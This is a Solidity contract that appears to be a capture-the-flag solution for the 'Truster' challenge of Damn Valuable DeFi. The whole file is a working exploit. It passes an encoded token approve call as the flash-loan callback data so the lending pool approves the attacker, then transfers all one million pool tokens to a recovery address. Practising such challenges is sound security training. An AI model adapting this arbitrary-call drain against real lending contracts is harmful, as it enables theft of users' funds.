pragma solidity =0.8.25;
import {DamnValuableToken} from "../DamnValuableToken.sol";

interface ITrusterLender{
     function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract TrustAttacker{
    DamnValuableToken dvt;
    ITrusterLender lender;
    address recovery; 

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _dvt, address _lender, address _recovery){
        dvt = DamnValuableToken(_dvt);
        lender = ITrusterLender(_lender);
        recovery = _recovery;
    }

    function attack() public{
        bytes memory payload = abi.encodeCall(dvt.approve, (address(this), TOKENS_IN_POOL));
        lender.flashLoan(0, address(this), address(dvt), payload); 
        dvt.transferFrom(address(lender), recovery, TOKENS_IN_POOL);
    }

}